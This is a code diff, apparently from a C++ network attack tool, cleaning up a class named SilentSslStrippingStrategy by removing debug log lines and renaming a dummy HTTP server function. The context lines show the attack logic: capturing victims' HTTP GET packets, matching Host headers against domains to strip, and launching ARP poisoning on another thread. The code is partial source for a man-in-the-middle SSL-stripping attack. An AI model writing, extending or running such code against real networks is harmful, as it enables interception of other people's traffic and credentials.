@@ -46,7 +46,7 @@ HttpMessageData& getHttpMessageData() {
     return data;
 }
 
-void startAcceptingHttp() {
+void runHttpDummyServer() {
     const uint16_t HTTP_PORT = 80;
     std::thread([]() {
         try {
@@ -177,7 +177,7 @@ void connectWithServer(const std::string &domain) {
         }
 
     } catch (std::exception &e) {
-        std::cerr << "Exception: " << e.what() << std::endl;
+        LOG_ERROR("Exception: " + std::string(e.what()));
     }
 }
 
@@ -185,21 +185,18 @@ void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
     pcpp::RawPacket *packet, pcpp::PcapLiveDevice * /*device*/,
     void * /*cookie*/) {
     pcpp::Packet parsedPacket(packet);
-    LOG_INFO("FOUNDDD");
 
     // Check IPv4 layer
     auto *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
     if (ipLayer == nullptr) {
         return;
     }
-    LOG_INFO("interesting")
 
     // Check if source IP matches some victim IP
     if (std::find(victimIps_.begin(), victimIps_.end(),
                   ipLayer->getSrcIPAddress().toString()) == victimIps_.end()) {
         return;
     }
-    LOG_INFO("FOUND PACKET1!");
 
     // Check TCP layer
     auto *tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
@@ -207,7 +204,6 @@ void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
     if ((tcpLayer == nullptr) || tcpLayer->getDstPort() != HTTP_PORT) {
         return;
     }
-    LOG_INFO("FOUND PACKET2!");
 
     // Access HTTP Layer
     auto *httpRequestLayer =
@@ -215,29 +211,24 @@ void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
     if (httpRequestLayer == nullptr) {
         return;
     }
-    LOG_INFO("FOUND PACKET3!");
 
     // Check if method is GET
     if (httpRequestLayer->getFirstLine()->getMethod() !=
         pcpp::HttpRequestLayer::HttpGET) {
         return;
     }
-    LOG_INFO("FOUND PACKET4!");
 
     // Check Host header
     pcpp::HeaderField *hostField = httpRequestLayer->getFieldByName("Host");
     if (hostField == nullptr) {
         return;
     }
-    LOG_INFO("FOUND PACKET5!");
 
     // Check whether domain is in Host header and start SSL attack if so
     std::string hostValue = hostField->getFieldValue();
     for (const std::string &domain : domainsToStrip_) {
-        LOG_INFO("FOUND PACKET6!");
         if (hostValue.find(domain) != std::string::npos) {
             // TODO(Quinn)
-            LOG_INFO("FOUND PACKET7!");
 
             // Get the total packet size
             size_t packetSize = packet->getRawDataLen();
@@ -289,7 +280,6 @@ void ATK::SSL::SilentSslStrippingStrategy::execute() {
             << " \"" << ipsToSpoofCommaSeparated << "\"";
         std::string cmd = command.str();
 
-        LOG_INFO("got here!");
 // Start ARP poison on different thread
 #ifdef _WIN32
         HANDLE hJob = CreateJobObject(nullptr, nullptr);
@@ -324,10 +314,10 @@ void ATK::SSL::SilentSslStrippingStrategy::execute() {
         // TODO(Quinn) implement with DNS once it's available
     }
 
-    startAcceptingHttp();
+    runHttpDummyServer();
 
     if (!device_->open()) {
-        throw std::runtime_error("Unable to open interface, no way right??");
+        throw std::runtime_error("Unable to open interface");
     }
 
     std::promise<void> completionPromise;
@@ -340,7 +330,6 @@ void ATK::SSL::SilentSslStrippingStrategy::execute() {
             "Unable to set http request filters on interface");
     };
 
-    LOG_INFO("Got here too!");
     if (!device_->startCapture(
             [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                    void *cookie) { onPacketArrives(packet, device, cookie); },
